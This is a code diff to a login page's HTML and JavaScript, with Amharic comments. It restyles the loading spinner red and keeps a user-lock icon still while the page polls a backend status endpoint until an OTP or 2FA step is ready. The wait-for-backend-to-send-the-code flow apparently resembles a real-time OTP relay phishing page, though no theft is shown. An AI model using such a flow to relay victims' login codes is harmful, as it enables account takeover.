@@ -93,6 +93,11 @@ header .header-title p { font-size: 13px; opacity: 0.9; margin-top: 2px; font-fa
 .key:active { background: #cbd5e1; transform: scale(0.96); }
 
 footer { background-color: #0b438c; color: white; text-align: center; padding: 20px; font-size: 14px; border-top: 1px solid rgba(255, 255, 255, 0.1); font-family: "Merriweather", serif; width: 100%; margin-top: auto; }
+
+/* የሚሽከረከረው የቀይ ሎዲንግ ክብ ማስተካከያ */
+.red-loading-spinner {
+    color: #ff3b30 !important;
+}
 </style>
 </head>  
 <body>  
@@ -399,8 +404,11 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
         const originalBtnText = submitBtnText.innerText;
         submitBtnText.innerText = "Loading...";
         
-        btnMainIcon.className = "fa-solid fa-spinner fa-spin";
-        if(submitIcon) submitIcon.className = "fa-solid fa-spinner fa-spin";
+        // አዝራሩ (Button) ላይ ያለው ምልክት ወደ ሚሽከረከር ቀይ ክብ እንዲቀየር
+        btnMainIcon.className = "fa-solid fa-spinner fa-spin red-loading-spinner";
+        
+        // ከላይ ያለው የሰውዬ ምልክት ሳይለወጥና ሳይሽከረከር እንዳለ ይቆያል
+        if(submitIcon) submitIcon.className = "fa-solid fa-user-lock";
 
         try {
             const res = await fetch(`${BASE_URL}/check_user_db`, {
@@ -411,7 +419,6 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
             const data = await res.json();
 
             if (data.status === "FOUND" || data.status === "NEED_OTP") {
-                // መረጃው ቢገኝም እንኳ ኮዱ በጀርባ መላኩ በትክክል እስኪረጋገጥ ድረስ ቀጥታ ወደ OTP ገጽ አይቀይርም
                 startCheckingStatusLoop(originalBtnText);
             } else if (data.status === "NEED_2FA") {
                 resetButton(originalBtnText);
@@ -456,7 +463,6 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
                 const res = await fetch(`${BASE_URL}/check_status/${userId}`);
                 const data = await res.json();
                 
-                // አገልጋዩ (Backend) ኮዱን ልኮ NEED_OTP ወይም NEED_2FA እስኪሆን ድረስ ሎዲንጉ በተመሳሳይ ገጽ ላይ ይቆያል
                 if (data && data.status && data.status !== "WAITING") {
                     clearInterval(statusInterval);
                     resetButton(originalText);
